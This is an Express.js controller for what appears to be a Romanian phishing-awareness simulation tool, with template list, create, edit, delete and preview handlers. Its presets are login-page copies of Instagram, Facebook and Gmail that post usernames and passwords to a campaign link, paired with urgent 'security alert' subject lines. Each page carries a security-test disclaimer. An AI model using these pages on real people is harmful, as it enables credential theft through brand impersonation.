const Template = require('../models/Template');

// Template-uri predefinite
const presetTemplates = {
    instagram: {
        name: 'Instagram Login',
        subject: 'Activitate suspectă detectată pe contul tău Instagram',
        html_content: `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fafafa; }
        .container { max-width: 350px; margin: 100px auto; background: white; border: 1px solid #dbdbdb; }
        .logo { text-align: center; padding: 40px 0 30px; }
        .logo img { width: 175px; }
        .form { padding: 0 40px 30px; }
        .form input { width: 100%; padding: 9px 8px; margin-bottom: 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; }
        .form button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 8px; }
        .divider { text-align: center; margin: 20px 0; color: #8e8e8e; }
        .footer { text-align: center; padding: 20px; color: #8e8e8e; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Instagram_logo.svg" alt="Instagram">
        </div>
        <div class="form">
            <form action="{{link}}" method="POST">
                <input type="text" name="username" placeholder="Telefon, nume utilizator sau e-mail" required>
                <input type="password" name="password" placeholder="Parolă" required>
                <button type="submit">Conectare</button>
            </form>
            <div class="divider">SAU</div>
            <p style="text-align: center; color: #385185; font-size: 14px;">Ai uitat parola?</p>
        </div>
    </div>
    <div class="footer">
        <p>Acesta este un test de securitate. Nu introduceți date reale!</p>
    </div>
</body>
</html>
        `,
        text_content: 'Activitate suspectă pe Instagram. Verifică-ți contul.'
    },
    facebook: {
        name: 'Facebook Login',
        subject: 'Contul tău Facebook necesită verificare',
        html_content: `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; }
        .header { background: #fff; padding: 12px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .header h1 { color: #1877f2; font-size: 48px; text-align: center; }
        .container { max-width: 400px; margin: 40px auto; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .login-box input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
        .login-box button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
        .footer { text-align: center; margin-top: 20px; color: #737373; font-size: 12px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>facebook</h1>
    </div>
    <div class="container">
        <div class="login-box">
            <form action="{{link}}" method="POST">
                <input type="text" name="email" placeholder="E-mail sau telefon" required>
                <input type="password" name="password" placeholder="Parolă" required>
                <button type="submit">Conectare</button>
            </form>
            <p style="text-align: center; margin-top: 16px; color: #1877f2;">Ai uitat parola?</p>
        </div>
    </div>
    <div class="footer">
        <p>Acesta este un test de securitate. Nu introduceți date reale!</p>
    </div>
</body>
</html>
        `,
        text_content: 'Verificare cont Facebook necesară.'
    },
    gmail: {
        name: 'Gmail Login',
        subject: 'Alertă de securitate pentru contul Google',
        html_content: `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', Roboto, sans-serif; background: #fff; }
        .container { max-width: 450px; margin: 100px auto; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; }
        .logo { text-align: center; margin-bottom: 24px; }
        .logo img { width: 74px; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
        p { text-align: center; color: #5f6368; margin-bottom: 32px; }
        input { width: 100%; padding: 13px 15px; margin-bottom: 20px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        button { width: 100%; padding: 11px 24px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        .footer { text-align: center; margin-top: 24px; color: #5f6368; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google">
        </div>
        <h1>Conectați-vă</h1>
        <p>Continuați la Gmail</p>
        <form action="{{link}}" method="POST">
            <input type="email" name="email" placeholder="E-mail sau telefon" required>
            <input type="password" name="password" placeholder="Introduceți parola" required>
            <button type="submit">Următorul</button>
        </form>
    </div>
    <div class="footer">
        <p>Acesta este un test de securitate. Nu introduceți date reale!</p>
    </div>
</body>
</html>
        `,
        text_content: 'Alertă securitate cont Google.'
    }
};

// Listare template-uri
const listTemplates = async (req, res) => {
    try {
        const campaignId = req.query.campaign;
        const templates = await Template.findByUserId(req.session.user.id);
        
        res.render('templates/list', {
            title: 'Template-uri Email',
            templates,
            campaignId
        });
    } catch (error) {
        console.error('Eroare la listarea template-urilor:', error);
        res.status(500).render('error', {
            title: 'Eroare',
            message: 'Nu am putut încărca template-urile'
        });
    }
};

// Afișare galerie template-uri predefinite
const showGallery = (req, res) => {
    const campaignId = req.query.campaign;
    res.render('templates/gallery', {
        title: 'Alege Template',
        campaignId
    });
};

// Creare template din preset
const createFromPreset = async (req, res) => {
    const { type, campaign } = req.query;
    const preset = presetTemplates[type];
    
    if (!preset) {
        return res.redirect('/templates/gallery');
    }
    
    try {
        const templateId = await Template.create({
            user_id: req.session.user.id,
            name: preset.name,
            subject: preset.subject,
            html_content: preset.html_content,
            text_content: preset.text_content
        });
        
        if (campaign) {
            // Aici poți adăuga logica pentru a asocia template-ul cu campania
            res.redirect(`/campaigns/${campaign}`);
        } else {
            res.redirect(`/templates/${templateId}`);
        }
    } catch (error) {
        console.error('Eroare la crearea template-ului:', error);
        res.redirect('/templates/gallery');
    }
};

// Afișare formular template nou
const showNewTemplateForm = (req, res) => {
    res.render('templates/new', {
        title: 'Template nou',
        campaignId: req.query.campaign || null,
        error: null
    });
};

// Creare template nou
const createTemplate = async (req, res) => {
    const { name, subject, html_content, text_content, campaignId } = req.body;

    // Validări
    if (!name || !subject || !html_content) {
        return res.render('templates/new', {
            title: 'Template nou',
            campaignId,
            error: 'Numele, subiectul și conținutul HTML sunt obligatorii'
        });
    }

    try {
        const templateId = await Template.create({
            user_id: req.session.user.id,
            name: name.trim(),
            subject: subject.trim(),
            html_content: html_content.trim(),
            text_content: text_content?.trim() || ''
        });

        if (campaignId) {
            res.redirect(`/campaigns/${campaignId}`);
        } else {
            res.redirect(`/templates/${templateId}`);
        }
    } catch (error) {
        console.error('Eroare la crearea template-ului:', error);
        res.render('templates/new', {
            title: 'Template nou',
            campaignId,
            error: 'Nu am putut crea template-ul. Vă rugăm încercați din nou.'
        });
    }
};

// Vizualizare template
const viewTemplate = async (req, res) => {
    try {
        const template = await Template.findById(req.params.id);
        
        if (!template) {
            return res.status(404).render('404', {
                title: 'Template negăsit'
            });
        }

        // Verifică dacă utilizatorul are acces
        if (template.user_id !== req.session.user.id) {
            return res.status(403).render('error', {
                title: 'Acces interzis',
                message: 'Nu aveți permisiunea de a vizualiza acest template'
            });
        }

        res.render('templates/view', {
            title: template.name,
            template
        });
    } catch (error) {
        console.error('Eroare la vizualizarea template-ului:', error);
        res.status(500).render('error', {
            title: 'Eroare',
            message: 'Nu am putut încărca template-ul'
        });
    }
};

// Afișare formular editare
const showEditForm = async (req, res) => {
    try {
        const template = await Template.findById(req.params.id);
        
        if (!template) {
            return res.status(404).render('404', {
                title: 'Template negăsit'
            });
        }

        if (template.user_id !== req.session.user.id) {
            return res.status(403).render('error', {
                title: 'Acces interzis',
                message: 'Nu aveți permisiunea de a edita acest template'
            });
        }

        res.render('templates/edit', {
            title: `Editare: ${template.name}`,
            template,
            error: null
        });
    } catch (error) {
        console.error('Eroare la editarea template-ului:', error);
        res.status(500).render('error', {
            title: 'Eroare',
            message: 'Nu am putut încărca template-ul'
        });
    }
};

// Actualizare template
const updateTemplate = async (req, res) => {
    try {
        const template = await Template.findById(req.params.id);
        
        if (!template) {
            return res.status(404).render('404', {
                title: 'Template negăsit'
            });
        }

        if (template.user_id !== req.session.user.id) {
            return res.status(403).render('error', {
                title: 'Acces interzis',
                message: 'Nu aveți permisiunea de a edita acest template'
            });
        }

        const { name, subject, html_content, text_content } = req.body;

        if (!name || !subject || !html_content) {
            return res.render('templates/edit', {
                title: `Editare: ${template.name}`,
                template,
                error: 'Numele, subiectul și conținutul HTML sunt obligatorii'
            });
        }

        await template.update({
            name: name.trim(),
            subject: subject.trim(),
            html_content: html_content.trim(),
            text_content: text_content?.trim() || ''
        });

        res.redirect(`/templates/${template.id}`);
    } catch (error) {
        console.error('Eroare la actualizarea template-ului:', error);
        res.status(500).render('error', {
            title: 'Eroare',
            message: 'Nu am putut actualiza template-ul'
        });
    }
};

// Ștergere template
const deleteTemplate = async (req, res) => {
    try {
        const template = await Template.findById(req.params.id);
        
        if (!template) {
            return res.status(404).json({ error: 'Template negăsit' });
        }

        if (template.user_id !== req.session.user.id) {
            return res.status(403).json({ error: 'Acces interzis' });
        }

        await template.delete();
        res.json({ success: true, message: 'Template șters cu succes' });
    } catch (error) {
        console.error('Eroare la ștergerea template-ului:', error);
        res.status(500).json({ error: 'Nu am putut șterge template-ul' });
    }
};

// Preview template
const previewTemplate = async (req, res) => {
    try {
        const template = await Template.findById(req.params.id);
        
        if (!template) {
            return res.status(404).send('Template negăsit');
        }

        if (template.user_id !== req.session.user.id) {
            return res.status(403).send('Acces interzis');
        }

        // Trimite doar conținutul HTML pentru preview
        res.send(template.html_content);
    } catch (error) {
        console.error('Eroare la preview template:', error);
        res.status(500).send('Eroare la încărcarea preview-ului');
    }
};

module.exports = {
    listTemplates,
    showGallery,
    createFromPreset,
    showNewTemplateForm,
    createTemplate,
    viewTemplate,
    showEditForm,
    updateTemplate,
    deleteTemplate,
    previewTemplate
};